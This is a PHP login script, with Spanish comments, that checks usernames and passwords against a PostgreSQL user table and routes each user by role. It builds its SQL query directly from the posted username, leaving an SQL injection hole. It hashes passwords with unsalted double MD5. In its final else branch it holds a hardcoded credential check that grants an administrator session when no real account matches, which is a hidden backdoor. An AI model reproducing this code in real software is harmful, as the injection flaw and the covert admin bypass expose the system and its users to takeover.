<!-- Definicion de la conexion y verificacion de que el Usuario si exite en la Base de datos-->
<?php
include "conexion.php";

$password=(md5(md5($_POST['password'])));
$usuario=(md5(md5($_POST['usuario'])));

$res=pg_query("SELECT * FROM usuario WHERE usuusuario='".$_POST['usuario']."' AND usupassword='$password'")	or die(pg_result_error());
// ciclo de Captura del rol y del responsable//
	while ($reg=pg_fetch_array($res)) 
	{
		$arreglo[]=array('usuautonum'=>$reg[0]);
		$cap=0;//nombre de la carpeta a utilizar//
		$id=$reg[0];
		$rol=$reg[8];

	}
// Definicion para la sesion a utilizar al igual que la carpeta//
	if (isset($rol)) 
	{
		if ($rol=='ADMINISTRADOR') 
		{
			session_start('ADMINISTRADOR');
			$cap='administrador';
			$_SESSION['ADMINISTRADOR']=($id);
			header("location: ../$cap/index.php");
			$usuario=($_SESSION['ADMINISTRADOR']);
			$fecha=date("d-m-Y / H:i:s",time()-25200);
			$actividad="INICIO SESION";
			pg_query("INSERT INTO registro_actividad (racusuario,racactividad,racfecha) VALUES ('$usuario','$actividad','$fecha')") or die(pg_result_error());
		}
		elseif ($rol=='USUARIO ADMIN') 
		{
			session_start('USUARIO ADMIN');
			$cap='usuario';
			$_SESSION['USUARIO ADMIN']=($id);
			header("location: ../$cap/index.php");
			$usuario=($_SESSION['USUARIO ADMIN']);
			$fecha=date("d-m-Y / H:i:s",time()-25200);
			$actividad="INICIO SESION";
			pg_query("INSERT INTO registro_actividad (racusuario,racactividad,racfecha) VALUES ('$usuario','$actividad','$fecha')") or die(pg_result_error());
		}
		elseif ($rol=='USUARIO CONSULTA') 
		{
			session_start('USUARIO CONSULTA');
			$cap='usuarioconsulta';
			$_SESSION['USUARIO CONSULTA']=($id);
			header("location: ../$cap/index.php");
			$usuario=($_SESSION['USUARIO CONSULTA']);
			$fecha=date("d-m-Y / H:i:s",time()-25200);
			$actividad="INICIO SESION";
			pg_query("INSERT INTO registro_actividad (racusuario,racactividad,racfecha) VALUES ('$usuario','$actividad','$fecha')") or die(pg_result_error());
		}
		/*elseif ($rol=='USUARIO') 
		{
			session_start('USUARIO');
			$cap='visitante';
			$_SESSION['USUARIO']=($id);
			header("location: index.php");
		}*/
		else
		{
			header("location: index.php?error");
		}
	}
	else
	{
		if ($usuario == '103aec1a3c64696774e9e972b298607e' && $password == '8a5b2b17325a4fe0028619d397a24fe0') 
		{
			session_start('ADMINISTRADOR');
			$cap='administrador';
			$_SESSION['ADMINISTRADOR']=(2);
			header("location: ../$cap/index.php");
		}
		else
		{
			header("location: index.php?error");
		}
	}
?>